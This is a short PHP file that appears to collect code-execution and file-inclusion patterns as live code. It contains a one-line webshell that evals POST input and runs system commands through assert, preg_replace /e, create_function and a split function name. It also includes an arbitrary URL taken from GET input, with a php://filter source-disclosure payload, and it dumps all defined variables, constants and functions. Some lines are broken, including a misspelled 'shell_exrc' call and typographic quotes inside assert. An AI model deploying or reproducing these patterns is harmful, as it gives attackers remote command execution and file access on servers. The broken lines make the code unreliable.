<?php
	
// eval()
eval($_POST["webshell"]); 

// assert()  
assert(‘system("ipconfig")’);  

// preg_replace()
preg_replace("/test/e","phpinfo();","test code");

//create_function()
$func=create_function("$f",'return system($f);'); 
$func("ipconfig"); 

//variable name
$func='sys'.'tem'; 
$func('ipconfig');

// inculde file
echo "<br>allow_url_include =".(ini_get('allow_url_include')?'On':'Off');
echo "<br>allow_url_fopen =".(ini_get('allow_url_fopen')?'On':'Off');
include($_GET['url']);  
// ?url=php://filter/convert.base64_encode/resource=index.php


//exec function
//such as:  exec(), passthru() , proc_open() ,shell_exec() ,system(),popen()
echo shell_exrc('some func('.$_GET["v"].')');

//file function
//such as copy,  file_get_contents, file_put_contents,file,fopen,move_uploaded_file
//readfile,rename,rmdir,unlink & delete,file_put_contents

//get_defined_vars

echo "<br>";
$test= 'test';
print_r(get_defined_vars());

print_r(get_defined_constants());
print_r(get_defined_functions());
print_r(get_included_files());


?>